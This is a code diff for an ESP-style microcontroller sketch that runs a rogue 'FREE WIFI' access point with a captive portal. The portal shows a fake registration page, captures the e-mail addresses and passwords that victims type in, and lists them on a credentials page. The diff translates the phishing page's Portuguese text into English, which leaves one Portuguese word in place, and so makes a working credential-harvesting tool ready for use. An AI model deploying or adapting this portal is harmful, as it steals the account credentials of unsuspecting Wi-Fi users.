@@ -5,13 +5,13 @@
  
 // User configuration
 #define SSID_NAME "FREE WIFI"
-#define SUBTITLE "WIFI Gratuito e Ilimitado"
-#define TITLE "Registo:"
-#define BODY "Para usufruir do serviço gratuito, deve criar uma conta."
-#define POST_TITLE "Conta criada com sucesso"
-#define POST_BODY "Por favor, aguarde uns segundos para o seu dispositivo se conectar.</br>Obrigado."
-#define PASS_TITLE "Credenciais"
-#define CLEAR_TITLE "Apagada"
+#define SUBTITLE "Unlimited Free Wifi"
+#define TITLE "Sign In:"
+#define BODY "Sign In To Use Free Wifi"
+#define POST_TITLE "Account Successfully Registered"
+#define POST_BODY "Please wait while you are being connected...</br>Obrigado."
+#define PASS_TITLE "Credentials"
+#define CLEAR_TITLE "Turn Off"
  
 int capcount=0;
 int BUILTIN_LED = 10;
@@ -22,7 +22,7 @@ const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1); // Gateway
  
-String Credenciais = "";
+String Credentials = "";
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer; WebServer webServer(80);
  
@@ -34,7 +34,7 @@ String input(String argName) {
  
 String footer() {
   return
-    "</div><div class=q><a>&#169; Todos os direitos reservados.</a></div>";
+    "</div><div class=q><a>&#169; All rights reserved.</a></div>";
 }
  
 String header(String t) {
@@ -57,27 +57,27 @@ String header(String t) {
 }
  
 String creds() {
-  return header(PASS_TITLE) + "<ol>" + Credenciais + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar</a></p><p><a style=\"color:blue\" href=/clear>Limpar passwords</a></p></center>" + footer();
+  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
  
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
          "<b>E-mail:</b> <center><input type=text autocomplete=email name=email></input></center>" +
-         "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Registar\"></form></center>" + footer();
+         "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign In\"></form></center>" + footer();
 }
  
 String posted() {
   String email = input("email");
   String password = input("password");
-  Credenciais = "<li>E-mail: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credenciais;
+  Credentials = "<li>E-mail: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
   return header(POST_TITLE) + POST_BODY + footer();
 }
  
 String clear() {
   String email = "<p></p>";
   String password = "<p></p>";
-  Credenciais = "<p></p>";
-  return header(CLEAR_TITLE) + "<div><p>A lista de dados foi limpa com sucesso.</div></p><center><a style=\"color:blue\" href=/>Voltar</a></center>" + footer();
+  Credentials = "<p></p>";
+  return header(CLEAR_TITLE) + "<div><p>Data Cleared Successfully.</div></p><center><a style=\"color:blue\" href=/>Back</a></center>" + footer();
 }
  
 void BLINK() { // The internal LED will blink 5 times when a password is received.
